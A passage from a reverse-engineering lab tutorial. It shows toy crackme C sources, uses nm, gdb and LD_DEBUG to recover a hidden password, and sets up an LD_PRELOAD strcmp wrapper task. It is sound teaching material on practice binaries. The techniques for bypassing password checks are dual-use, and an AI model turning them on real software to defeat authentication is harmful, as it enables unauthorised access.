&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1000&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Password:&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">fgets&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1000&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">stdin&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#204a87">NULL&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">exit&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">strlen&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;\0&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">!&lt;/span>&lt;span style="color:#000">strcmp&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">deobf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">correct_pass&lt;/span>&lt;span style="color:#000;font-weight:bold">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Correct!&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Nope!&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="03-tutorial---symbols-nm">03. Tutorial - Symbols: nm&lt;/h3>
&lt;p>Symbols are basically tags/labels, either for functions or for variables. If you enable debugging symbols you will get information on all the variables defined but normally symbols are only defined for functions and global variables. When stripping binaries even these can be deleted without any effect on the binary behavior. Dynamic symbols, however, have to remain so that the linker knows what functions to import:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ file xy
xy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.16, not stripped
$ nm xy
0804a020 B __bss_start
0804a018 D __data_start
0804a018 W data_start
0804a01c D __dso_handle
08049f0c d _DYNAMIC
0804a020 D _edata
0804a024 B _end
080484e4 T _fini
080484f8 R _fp_hw
0804a000 d _GLOBAL_OFFSET_TABLE_
w __gmon_start__
080482d4 T _init
08049f04 t __init_array_end
08049f00 t __init_array_start
080484fc R _IO_stdin_used
w _ITM_deregisterTMCloneTable
w _ITM_registerTMCloneTable
w _Jv_RegisterClasses
080484e0 T __libc_csu_fini
08048470 T __libc_csu_init
U __libc_start_main@@GLIBC_2.0
0804843c T main
U puts@@GLIBC_2.0
08048340 T _start
0804a020 D __TMC_END__
08048370 T __x86.get_pc_thunk.bx
$ strip xy
$ nm xy
nm: xy: no symbols
$ nm -D xy
w __gmon_start__
080484fc R _IO_stdin_used
U __libc_start_main
U puts
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s take a look at another crackme that combines crackme1 and crackme2. What would you do if you couldn&amp;rsquo;t use neither strings nor ltrace to get anything useful?&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">correct_pass&lt;/span>&lt;span style="color:#000;font-weight:bold">[]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">????????????????????????&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">my_strcmp&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">s1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">s2&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">size_t&lt;/span> &lt;span style="color:#000">i&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">len&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">strlen&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">s1&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">len&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">for&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">i&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#000">i&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;&lt;/span> &lt;span style="color:#000">len&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#000">i&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">++&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">s1&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">i&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">!=&lt;/span> &lt;span style="color:#000">s2&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">i&lt;/span>&lt;span style="color:#000;font-weight:bold">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">deobf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">s&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">???????????????????????????&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1000&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">deobf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">correct_pass&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Password:&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">fgets&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1000&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">stdin&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#204a87">NULL&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">exit&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">strlen&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;\0&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">!&lt;/span>&lt;span style="color:#000">my_strcmp&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">correct_pass&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Correct!&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Nope!&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In &lt;a href="./activities/03-tutorial-symbols/src">crackme3&lt;/a>, deobfuscation is done before the password is read. Since the &lt;code>correct_pass&lt;/code> has an associated symbol that is stored at a known location you can obtain the address and peer into it at runtime:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nm crackme3 | grep pass
0804a02c D correct_pass
$ gdb -n ./crackme3
Reading symbols from ./crackme3...(no debugging symbols found)...done.
(gdb) run
Password:
^C
Program received signal SIGINT, Interrupt.
0xf7fdb430 in __kernel_vsyscall ()
(gdb) x/s 0x0804a02c
0x804a02c &amp;lt;correct_pass&amp;gt;: &amp;#34;JWxb7gE2pjiY3gRG8U&amp;#34;
&lt;/code>&lt;/pre>&lt;p>The above &lt;code>x/s 0x0804a02c&lt;/code> command in GDB is used for printing the string starting from address &lt;code>0x0804a02c&lt;/code>. &lt;code>x&lt;/code> stands for examine memory and &lt;code>s&lt;/code> stands for string format. In short it dumps memory in string format starting from the address passed as argument. You may print multiple strings by prefixing &lt;code>s&lt;/code> with a number, for example &lt;code>x/20s 0x0804a02c&lt;/code>.&lt;/p>
&lt;p>For other programs (that are not stripped) you can even get a hint as to what they do using solely &lt;code>nm&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ nm mystery_binary
.....
0000000000402bef T drop_privs(char const*)
00000000004027db T IndexHandler(std::string const&amp;amp;, HttpRequest const&amp;amp;, HttpResponse*)
0000000000402ad8 T StatusHandler(std::string const&amp;amp;, HttpRequest const&amp;amp;, HttpResponse*)
000000000040237f T NotFoundHandler(std::string const&amp;amp;, HttpRequest const&amp;amp;, HttpResponse*)
00000000004024a1 T BadRequestHandler(std::string const&amp;amp;, HttpRequest const&amp;amp;, HttpResponse*)
00000000004025c3 T MaybeAddCORSHeader(std::string const&amp;amp;, HttpRequest const&amp;amp;, HttpResponse*)
0000000000402f52 t __static_initialization_and_destruction_0(int, int)
0000000000402cf8 T handle(int)
00000000004020fc T recvlen(int, char*, unsigned long)
0000000000402195 T sendlen(int, char const*, unsigned long)
0000000000402224 T sendstr(int, char const*)
0000000000402255 T urldecode(std::string const&amp;amp;)
.....
&lt;/code>&lt;/pre>&lt;p>&lt;strong>Note:&lt;/strong> In this case the signatures are also decoded because the binary was compiled from C++ source code.&lt;/p>
&lt;p>Dealing with stripped binaries (or worse, statically linked binaries that have been stripped) is harder but can still be done. We&amp;rsquo;ll see how in a future lab.&lt;/p>
&lt;h3 id="04-tutorial---library-dependencies">04. Tutorial - Library dependencies&lt;/h3>
&lt;p>Most programs you will see make use of existing functionality. You don&amp;rsquo;t want to always reimplement string functions or file functions. Therefore, most programs use dynamic libraries. These shared objects, as they are called alternatively, allow you to have a smaller program and also allow multiple programs to use a single copy of the code within the library. But how does that actually work?&lt;/p>
&lt;p>What makes all of these programs work is the Linux dynamic linker/loader. This is a statically linked helper program that resolves symbol names from shared objects at runtime. We can use the dynamic linker to gather information about an executable.&lt;/p>
&lt;p>The first and most common thing to do is see what libraries the executable loads, with the &lt;a href="https://man7.org/linux/man-pages/man1/ldd.1.html">ldd&lt;/a> utility:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ldd /bin/ls
linux-vdso.so.1 (0x00007ffff13fe000)
librt.so.1 =&amp;gt; /lib64/librt.so.1 (0x00007fc9b4893000)
libacl.so.1 =&amp;gt; /lib64/libacl.so.1 (0x00007fc9b468a000)
libc.so.6 =&amp;gt; /lib64/libc.so.6 (0x00007fc9b42da000)
libpthread.so.0 =&amp;gt; /lib64/libpthread.so.0 (0x00007fc9b40bd000)
libattr.so.1 =&amp;gt; /lib64/libattr.so.1 (0x00007fc9b3eb8000)
/lib64/ld-linux-x86-64.so.2 (0x00007fc9b4a9b000)
&lt;/code>&lt;/pre>&lt;p>We see that for each dependency in the executable, &lt;code>ldd&lt;/code> lists where it is found on the filesystem and where it is loaded in the process memory space. Alternatively, you can achieve the same result with the &lt;code>LD_TRACE_LOADED_OBJECTS&lt;/code> environment variable, or with the dynamic loader itself:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ LD_TRACE_LOADED_OBJECTS=whatever /bin/ls
linux-vdso.so.1 (0x00007fff325fe000)
librt.so.1 =&amp;gt; /lib64/librt.so.1 (0x00007f1845386000)
libacl.so.1 =&amp;gt; /lib64/libacl.so.1 (0x00007f184517d000)
libc.so.6 =&amp;gt; /lib64/libc.so.6 (0x00007f1844dcd000)
libpthread.so.0 =&amp;gt; /lib64/libpthread.so.0 (0x00007f1844bb0000)
libattr.so.1 =&amp;gt; /lib64/libattr.so.1 (0x00007f18449ab000)
/lib64/ld-linux-x86-64.so.2 (0x00007f184558e000)
$ /lib/ld-linux-x86-64.so.2 --list /bin/ls
linux-vdso.so.1 (0x00007fff1e712000)
librt.so.1 =&amp;gt; /lib64/librt.so.1 (0x00007f18a07d8000)
libacl.so.1 =&amp;gt; /lib64/libacl.so.1 (0x00007f18a05cf000)
libc.so.6 =&amp;gt; /lib64/libc.so.6 (0x00007f18a021e000)
libattr.so.1 =&amp;gt; /lib64/libattr.so.1 (0x00007f189fdfc000)
libpthread.so.0 =&amp;gt; /lib64/libpthread.so.0 (0x00007f18a0001000)
/lib64/ld-linux-x86-64.so.2 =&amp;gt; /lib/ld-linux-x86-64.so.2 (0x00007f18a0c44000)
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>When using the loader directly, make sure the loader and the executable are compiled for the same platform (e.g. they are both 64-bit or 32-bit).&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>You may find out more information about dynamic linker/loader variables in its man page. Issue the command&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>man ld-linux.so
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>and search for the LD_ string to find variables information.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>ldd&lt;/code> shows us &lt;strong>which&lt;/strong> libraries are loaded, but it&amp;rsquo;s not any clearer how the loader knows &lt;strong>where&lt;/strong> to load them from. First of all, the loader checks every dependency for a slash character. If it finds such a dependency it loads the library from that path, whether it is a relative of absolute path. But it is not the case in our example. For dependencies without slashes, the search order is as follows:&lt;/p>
&lt;ul>
&lt;li>&lt;code>DT_RPATH&lt;/code> attribute in the &lt;code>.dynamic&lt;/code> section of the executable, provided there is no &lt;code>DT_RUNPATH&lt;/code>; this is deprecated&lt;/li>
&lt;li>&lt;code>LD_LIBRARY_PATH&lt;/code> environment variable, which is similar to PATH; does not work with SUID/SGID programs&lt;/li>
&lt;li>&lt;code>DT_RUNPATH&lt;/code> attribute in the .dynamic section of the executable&lt;/li>
&lt;li>&lt;code>/etc/ld.so.cache&lt;/code>, generated by &lt;a href="https://man7.org/linux/man-pages/man8/ldconfig.8.html">ldconfig&lt;/a>&lt;/li>
&lt;li>&lt;code>/lib&lt;/code> and then &lt;code>/usr/lib&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>The last two options are skipped if the program was linked with the &lt;code>-z nodeflib&lt;/code> option.&lt;/p>
&lt;p>Now let&amp;rsquo;s see exactly where the loader finds the libraries:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ LD_DEBUG=libs /bin/ls
11451: find library=librt.so.1 [0]; searching
11451: search cache=/etc/ld.so.cache
11451: trying file=/lib64/librt.so.1
11451:
11451: find library=libacl.so.1 [0]; searching
11451: search cache=/etc/ld.so.cache
11451: trying file=/lib64/libacl.so.1
11451:
11451: find library=libc.so.6 [0]; searching
11451: search cache=/etc/ld.so.cache
11451: trying file=/lib64/libc.so.6
11451:
11451: find library=libpthread.so.0 [0]; searching
11451: search cache=/etc/ld.so.cache
11451: trying file=/lib64/libpthread.so.0
11451:
11451: find library=libattr.so.1 [0]; searching
11451: search cache=/etc/ld.so.cache
11451: trying file=/lib64/libattr.so.1
&lt;/code>&lt;/pre>&lt;p>The &lt;code>LD_DEBUG&lt;/code> environment variable makes the dynamic loader be verbose about what it&amp;rsquo;s doing. Try &lt;code>LD_DEBUG=help&lt;/code> if you&amp;rsquo;re curious about what else you can find out. We can see in the output listed above that all the libraries are found via the loader cache. The number at the beginning of each line is ls&amp;rsquo;s PID.&lt;/p>
&lt;p>And now we can discuss &lt;strong>how&lt;/strong> the loader resolves symbols after it has found the libraries containing them. While variables are resolved when the library is opened, that is not the case for function references. When dealing with functions, the Linux dynamic loader uses something called lazy binding, which means that a function symbol in the library is not resolved until the very first call to it. Think about why this difference exists.&lt;/p>
&lt;p>You can see the way lazy binding behaves:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ LD_DEBUG=symbols,bindings ./crackme2
...
11480: initialize program: ./crackme2
11480:
11480:
11480: transferring control: ./crackme2
11480:
11480: symbol=puts; lookup in file=./crackme2 [0]
11480: symbol=puts; lookup in file=/lib32/libc.so.6 [0]
11480: binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol &amp;#39;puts&amp;#39; [GLIBC_2.0]
Password:
11480: symbol=fgets; lookup in file=./crackme2 [0]
11480: symbol=fgets; lookup in file=/lib32/libc.so.6 [0]
11480: binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol &amp;#39;fgets&amp;#39; [GLIBC_2.0]
I_pity_da_fool_who_gets_here_without_solving_crackme2
11480: symbol=strlen; lookup in file=./crackme2 [0]
11480: symbol=strlen; lookup in file=/lib32/libc.so.6 [0]
11480: binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol &amp;#39;strlen&amp;#39; [GLIBC_2.0]
11480: symbol=strcmp; lookup in file=./crackme2 [0]
11480: symbol=strcmp; lookup in file=/lib32/libc.so.6 [0]
11480: binding file ./crackme2 [0] to /lib32/libc.so.6 [0]: normal symbol &amp;#39;strcmp&amp;#39; [GLIBC_2.0]
Nope!
11480:
11480: calling fini: ./crackme2 [0]
11480:
&lt;/code>&lt;/pre>&lt;p>As you can see, functions like &lt;code>puts()&lt;/code>, &lt;code>fgets()&lt;/code>, &lt;code>strlen()&lt;/code> and &lt;code>strcmp()&lt;/code> are not actually resolved until the first call to them is made. Make the loader resolve all the symbols at startup. (Hint: &lt;a href="https://man7.org/linux/man-pages/man8/ld-linux.8.html">ld-linux&lt;/a>).&lt;/p>
&lt;p>&lt;strong>Library Wrapper Task&lt;/strong>&lt;/p>
&lt;p>You&amp;rsquo;ve previously solved &lt;code>crackme2&lt;/code> with the help of the &lt;code>ltrace&lt;/code>. Check out the files from &lt;a href="./activities/04-tutorial-library-dependencies/src">04-tutorial-library-dependencies&lt;/a>. The folder consists of a &lt;code>Makefile&lt;/code> and a C source code file reimplementing the &lt;code>strcmp()&lt;/code> function (library wrapper). The &lt;code>strcmp.c&lt;/code> implementation uses &lt;code>LD_PRELOAD&lt;/code> to wrap the actual &lt;code>strcmp()&lt;/code> call to our own.&lt;/p>
&lt;p>In order to see how that works, we need to create a shared library and pass it as an argument to &lt;code>LD_PRELOAD&lt;/code>. The &lt;code>Makefile&lt;/code> already takes care of this. To build and run the entire thing, simply run:&lt;/p>
&lt;pre tabindex="0">&lt;code>make run
